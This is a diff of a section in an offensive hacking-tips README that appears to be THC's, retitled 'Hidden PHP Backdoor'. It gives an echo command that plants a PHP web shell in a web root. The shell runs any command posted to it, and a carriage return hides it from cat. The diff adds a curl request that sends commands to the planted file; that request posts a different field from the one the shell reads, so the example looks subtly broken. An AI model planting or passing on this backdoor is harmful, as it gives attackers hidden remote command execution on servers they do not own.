@@ -53,7 +53,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Background reverse shell](#backdoor-background-reverse-shell)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
-   1. [Carriage return backdoor](#carriage-return-backdoor) 
+   1. [Hidden PHP backdoor](#carriage-return-backdoor) 
 1. [Shell Hacks](#shell-hacks)
    1. [Shred files (secure delete)](#shred)
    1. [Restore the date of a file](#restore-timestamp)
@@ -1036,19 +1036,13 @@ Other methods:
 * [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.
 
 <a id="carriage-return-backdoor"></a>
-**6.iv. Carriage Return Backdoor**
+**6.iv. Hidden PHP Backdoor**
 
-This method allows to hide from cat the malicious content of a file with a simple carriage return character: 
+Hide from `cat` with a [simple carriage return](https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/): 
 ```sh
-bash$ echo -e "<?php if(isset(\$_POST[0])){\`\$_POST[0]\`;} ?>\r<?php echo \"hello world\"; echo \" this is a test\"; ?>" > /var/www/html/test.php
-bash$ cat test.php
-<?php echo "hello world"; echo " this is a test"; ?>
-bash$ php test.php
-hello world this is a test
-bash$ strings test.php
-<?php if(isset($_POST[0])){`$_POST[0]`;} ?>
-<?php echo "hello world"; echo " this is a test"; ?>
-bash$
+echo -e "<?php if(isset(\$_POST[0])){\`\$_POST[0]\`;} ?>\r<?php echo \"hello world\"; echo \" this is a test\"; ?>" > /var/www/html/test.php
+###
+curl http://192.168.0.1/test.php -d 1="id; uname -mrs"
 ```
 ---
 <a id="shell-hacks"></a>
